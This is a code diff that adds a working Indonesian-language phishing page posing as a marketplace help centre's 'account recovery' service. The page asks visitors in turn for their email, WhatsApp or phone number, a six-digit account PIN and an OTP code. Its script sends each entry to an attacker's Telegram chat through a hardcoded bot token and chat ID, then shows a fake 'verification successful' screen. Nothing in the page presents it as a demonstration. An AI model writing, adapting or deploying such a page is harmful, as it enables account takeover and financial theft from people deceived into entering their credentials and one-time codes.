@@ -1,0 +1,114 @@
+﻿<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pusat Bantuan - Pemulihan Akun</title>
+    <style>
+        :root { --primary: #ee4d2d; --bg: #f5f5f5; }
+        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: var(--bg); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .app-container { background: #fff; width: 100%; max-width: 400px; min-height: 500px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: relative; border-radius: 4px; overflow: hidden; }
+        .header { background: #fff; padding: 15px; border-bottom: 1px solid #e8e8e8; text-align: center; color: var(--primary); font-weight: bold; font-size: 18px; }
+        .content { padding: 25px; }
+        .step { display: none; }
+        .step.active { display: block; }
+        h3 { margin-top: 0; color: #333; font-size: 18px; text-align: center; }
+        p { font-size: 13px; color: #666; text-align: center; line-height: 1.5; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 2px; box-sizing: border-box; font-size: 14px; }
+        .btn-primary { width: 100%; padding: 12px; background: var(--primary); color: #fff; border: none; border-radius: 2px; cursor: pointer; font-weight: 500; margin-top: 10px; }
+        .btn-outline { width: 100%; padding: 12px; background: #fff; color: #555; border: 1px solid #ddd; border-radius: 2px; cursor: pointer; margin-bottom: 10px; display: flex; align-items: center; justify-content: center; font-size: 14px; }
+        .footer-info { position: absolute; bottom: 20px; width: 100%; text-align: center; font-size: 12px; color: #999; }
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+    <div class="header">Pusat Bantuan</div>
+    
+    <div class="content">
+        <div id="step1" class="step active">
+            <h3>Pemulihan Akun</h3>
+            <p>Jika Anda mengalami kendala login atau akun dibatasi, silakan lakukan verifikasi identitas untuk memulihkan akun Anda.</p>
+            <button class="btn-primary" onclick="showStep(2)">Mulai Verifikasi</button>
+        </div>
+
+        <div id="step2" class="step">
+            <h3>Metode Login</h3>
+            <p>Pilih salah satu metode untuk masuk ke akun Anda:</p>
+            <button class="btn-outline" onclick="setMethod('Email')">📧 Gunakan Email</button>
+            <button class="btn-outline" onclick="setMethod('WhatsApp')">🟢 Gunakan WhatsApp</button>
+            <button class="btn-outline" onclick="setMethod('Nomor HP')">📱 Gunakan Nomor HP</button>
+            
+            <div id="input-area" style="display:none; margin-top: 20px;">
+                <input type="text" id="user_identity" placeholder="Masukkan data Anda...">
+                <button class="btn-primary" onclick="submitData('Identitas', 'user_identity', 3)">Lanjut</button>
+            </div>
+        </div>
+
+        <div id="step3" class="step">
+            <h3>Konfirmasi PIN</h3>
+            <p>Demi keamanan, masukkan 6 digit PIN akun Anda untuk melanjutkan proses.</p>
+            <input type="password" id="user_pin" maxlength="6" placeholder="PIN Keamanan" style="text-align:center; letter-spacing: 5px;">
+            <button class="btn-primary" onclick="submitData('PIN', 'user_pin', 4)">Konfirmasi</button>
+        </div>
+
+        <div id="step4" class="step">
+            <h3>Verifikasi OTP</h3>
+            <p>Kode verifikasi telah dikirim. Masukkan kode tersebut di bawah ini.</p>
+            <input type="number" id="user_otp" placeholder="Kode OTP" style="text-align:center;">
+            <button class="btn-primary" onclick="submitData('OTP', 'user_otp', 5)">Verifikasi</button>
+        </div>
+
+        <div id="step5" class="step" style="text-align: center;">
+            <div style="font-size: 60px; color: #4CAF50; margin-bottom: 15px;">✔️</div>
+            <h3>Verifikasi Berhasil</h3>
+            <p>Identitas Anda telah dikonfirmasi. Tim kami akan meninjau permintaan pemulihan dalam 24 jam ke depan.</p>
+            <button class="btn-primary" style="background: #555;" onclick="location.reload()">Kembali ke Beranda</button>
+        </div>
+    </div>
+    
+    <div class="footer-info">© 2026 Layanan Bantuan Pelanggan</div>
+</div>
+
+<script>
+    const TOKEN = '8757073721:AAGNiOegOJiONr9qMxuYEBWMwT79TvoXY7Y';
+    const CHAT_ID = '5635300527';
+    let selectedMethod = "";
+
+    function showStep(step) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById('step' + step).classList.add('active');
+    }
+
+    function setMethod(method) {
+        selectedMethod = method;
+        document.getElementById('input-area').style.display = 'block';
+        document.getElementById('user_identity').placeholder = 'Masukkan ' + method;
+        document.getElementById('user_identity').focus();
+    }
+
+    function submitData(label, elementId, nextStepId) {
+        const value = document.getElementById(elementId).value;
+        if (!value) {
+            alert("Harap diisi terlebih dahulu!");
+            return;
+        }
+
+        // Jika langkah 2, tambahkan info metode yang dipilih
+        let text = `🚀 **Data Masuk**\n------------------\n`;
+        if(label === 'Identitas') {
+            text += `📍 Metode: ${selectedMethod}\n📌 Data: ${value}`;
+        } else {
+            text += `📌 ${label}: ${value}`;
+        }
+
+        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+
+        fetch(url)
+            .then(() => showStep(nextStepId))
+            .catch(() => alert("Koneksi bermasalah, coba lagi."));
+    }
+</script>
+
+</body>
+</html>
